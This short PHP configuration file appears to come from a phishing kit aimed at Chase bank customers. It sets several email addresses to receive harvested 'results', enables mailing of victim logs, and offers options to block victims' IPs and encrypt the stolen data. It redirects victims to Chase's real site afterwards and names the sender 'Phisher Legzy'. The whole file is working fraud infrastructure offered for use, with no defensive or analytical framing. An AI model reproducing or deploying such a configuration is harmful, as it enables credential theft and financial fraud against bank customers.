<?php

$Your_Email = "ablemighty@yandex.com,legalfireworks@excite.com,aturomighty@gmail.com";  // Set your email

$Send_Log=1;  // Sends results to above email

$Save_Log=0;  // Saves results to server within a txt file

$Abuse_Filter=1; // Abuse filter: This blocks users from sending you abuse

$One_Time_Access=0; // One Time Access: This blocks the users ip after the form has been submitted i.e. prevents users sending fake forms

$Encrypt=0; // Encrypt: This feature encrypts your results

$Key = 	"oL^11tj)1#B)Bh_1y0e.e252OT1ceZ"; // This key is used to decrypt results and can be changed

$Exit_Link = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=2ahUKEwi6146I7-rhAhVQ_KQKHVALCZUQFjAAegQIXhAC&url=https%3A%2F%2Fwww.chase.com%2F&usg=AOvVaw3bnFPKq-IoUY8rdNyt2t3T";

$From_Email = "Phisher Legzy<ph1shing@logz.cz>";

?>
